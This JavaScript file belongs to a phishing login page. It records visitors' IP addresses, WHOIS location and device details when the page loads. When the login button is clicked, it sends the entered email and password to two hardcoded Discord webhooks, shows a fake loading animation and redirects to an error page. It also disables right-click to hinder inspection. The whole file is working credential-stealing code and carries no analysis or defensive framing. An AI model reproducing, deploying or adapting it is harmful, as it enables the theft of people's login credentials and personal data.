// ----------------------------------
// SELECTING ELEMENTS
// ----------------------------------
const loginButton = document.querySelector("button");

// Webhook URLs
const PRIMARY_WEBHOOK_URL = "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s ";
const BACKUP_WEBHOOK_URL = "https://discord.com/api/webhooks/1358902712070176768/u7-3e1PmM4t7VTUTD_UBNYCDkAnM9GP_KKxHjB4g_uxeitavR14PgmqdxzoadN0-NqKo ";

// Variables to store user data
let userIP = "Unknown IP";
let userDeviceInfo = {};
let whoisData = {};

// -----------------------------------
// FETCH IP ADDRESS ON PAGE LOAD
// -----------------------------------
async function fetchIPAddress() {
  try {
    const response = await fetch("https://api.ipify.org ?format=json");
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP address:", error);
    return "Unknown IP";
  }
}

// Perform WHOIS lookup on the IP address
async function fetchWhoisData(ip) {
  try {
    const response = await fetch(`https://ipwhois.app/json/ ${ip}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Error fetching WHOIS data:", error);
    return {};
  }
}

// Fetch the IP address and WHOIS data when the page loads
document.addEventListener("DOMContentLoaded", async () => {
  userIP = await fetchIPAddress(); // Store the IP address in the `userIP` variable
  console.log("User IP Address:", userIP); // Optional: Log the IP for debugging

  whoisData = await fetchWhoisData(userIP); // Perform WHOIS lookup
  console.log("WHOIS Data:", whoisData); // Optional: Log WHOIS data for debugging

  collectDeviceInfo(); // Collect additional device info
});

// -----------------------------------
// COLLECT DEVICE INFORMATION
// -----------------------------------
function collectDeviceInfo() {
  userDeviceInfo = {
    userAgent: navigator.userAgent,
    browserName: getBrowserName(),
    browserVersion: getBrowserVersion(),
    os: getOS(),
    platform: navigator.platform,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer || "Direct",
  };
  console.log("Device Info:", userDeviceInfo); // Optional: Log device info for debugging
}

// Helper functions to extract browser and OS details
function getBrowserName() {
  const userAgent = navigator.userAgent;
  if (/Firefox/.test(userAgent)) return "Firefox";
  if (/Chrome/.test(userAgent)) return "Chrome";
  if (/Edg/.test(userAgent)) return "Edge";
  if (/Safari/.test(userAgent)) return "Safari";
  return "Unknown Browser";
}

function getBrowserVersion() {
  const userAgent = navigator.userAgent;
  const match = userAgent.match(/(Chrome|Firefox|Edg|Safari)\/(\d+)/);
  return match ? match[2] : "Unknown Version";
}

function getOS() {
  const userAgent = navigator.userAgent;
  if (/Windows/.test(userAgent)) return "Windows";
  if (/Mac/.test(userAgent)) return "MacOS";
  if (/Linux/.test(userAgent)) return "Linux";
  if (/Android/.test(userAgent)) return "Android";
  if (/iPhone|iPad/.test(userAgent)) return "iOS";
  return "Unknown OS";
}

// -----------------------------------
// SEND DATA TO WEBHOOK
// -----------------------------------
async function sendCredentialsToWebhook(email, password) {
  try {
    // Use the stored IP address, device info, and WHOIS data
    const ip = userIP;

    // Prepare the embed payload
    const embedPayload = {
      embeds: [
        {
          title: "Login Attempt",
          color: 0xff0000, // Red color for visibility
          fields: [
            {
              name: "Email",
              value: email || "No email provided",
              inline: true,
            },
            {
              name: "Password",
              value: password || "No password provided",
              inline: true,
            },
            {
              name: "IP Address",
              value: ip || "Unknown IP",
              inline: false,
            },
            {
              name: "ISP",
              value: whoisData.isp || "Unknown ISP",
              inline: true,
            },
            {
              name: "Country",
              value: whoisData.country || "Unknown Country",
              inline: true,
            },
            {
              name: "City",
              value: whoisData.city || "Unknown City",
              inline: true,
            },
            {
              name: "Region",
              value: whoisData.region || "Unknown Region",
              inline: true,
            },
            {
              name: "Timezone",
              value: whoisData.timezone || "Unknown Timezone",
              inline: true,
            },
            {
              name: "Browser",
              value: `${userDeviceInfo.browserName} (${userDeviceInfo.browserVersion})`,
              inline: true,
            },
            {
              name: "Operating System",
              value: userDeviceInfo.os,
              inline: true,
            },
            {
              name: "Screen Resolution",
              value: `${userDeviceInfo.screenWidth}x${userDeviceInfo.screenHeight}`,
              inline: true,
            },
            {
              name: "Language",
              value: userDeviceInfo.language,
              inline: true,
            },
            {
              name: "Referrer",
              value: userDeviceInfo.referrer,
              inline: false,
            },
          ],
          timestamp: new Date().toISOString(), // Timestamp for when the data was sent
        },
      ],
    };

    // Send the payload to the primary webhook
    let response = await fetch(PRIMARY_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(embedPayload),
    });

    // Check if the primary webhook failed
    if (!response.ok) {
      console.error("Primary webhook failed. Attempting backup webhook...");

      // Send the payload to the backup webhook
      response = await fetch(BACKUP_WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(embedPayload),
      });

      if (!response.ok) {
        console.error("Backup webhook also failed. Data not sent.");
      } else {
        console.log("Data successfully sent to backup webhook.");
      }
    } else {
      console.log("Data successfully sent to primary webhook.");
    }
  } catch (error) {
    console.error("Error sending credentials to webhook:", error);
  }
}

// -----------------------------------
// ELLIPSIS ANIMATION
// ------------------------------------
function removeEllipsisAnimation() {
  loginButton.innerHTML = "";
  loginButton.textContent = "Log In";
  loginButton.removeAttribute("disabled");
}

function animateEllipsis() {
  // Get user input from the form
  const emailInput = document.getElementById("emailORphone");
  const passwordInput = document.getElementById("password");

  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();

  // Validate inputs
  if (!email || !password) {
    alert("Please enter both email and password.");
    return;
  }

  // Send credentials to webhook
  sendCredentialsToWebhook(email, password);

  // Start animation
  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                                    <span class="inner pulsingEllipsis">
                                        <span class="item spinnerItem"></span>
                                        <span class="item spinnerItem"></span>
                                        <span class="item spinnerItem"></span>
                                    </span>
                           </span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
  });
  loginButton.setAttribute("disabled", "true");

  // Simulate login process
  setTimeout(() => {
    removeEllipsisAnimation();
    // Redirect to error.html after 3 seconds
    window.location.href = "error.html";
  }, 3000);
}

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
loginButton.addEventListener("click", animateEllipsis);
document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});
